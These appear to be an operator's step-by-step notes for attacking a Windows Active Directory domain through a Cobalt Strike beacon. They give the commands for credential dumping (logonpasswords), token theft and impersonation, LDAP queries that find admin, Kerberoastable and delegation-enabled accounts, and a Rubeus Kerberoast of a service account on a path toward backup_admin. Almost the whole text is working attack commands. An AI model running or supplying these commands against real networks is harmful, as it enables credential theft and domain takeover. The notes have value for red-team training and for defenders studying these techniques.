    first steps: 
        1. enumerate my user to get an idea of what im working with
            beacon> run whoami /all
        2. check for low-hanging credential access (logged-in users, cached creds, tokens)
            beacon> logonpasswords
            beacon> ps (OR explore processes)
            beacon> users 
            beacon> token list
            beacon> steal_token <pid> (OR token impersonate)
        3. begin querying LDAP for additional object information 
            admin accounts using ldapsearch (&(samAccountType=805306368)(adminCount=1)(!(name=krbtgt)))
            accounts with SPN set using ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))))
            delegation settings!
                unconstrained: beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
                constrained: beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
        once ive gathered info visualize the env using BOFHound

    now we found svc_sql (Kerberoastable) and svc_sql → GenericWrite → backup_admin         
        kerberoast svc_sql using
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /simple
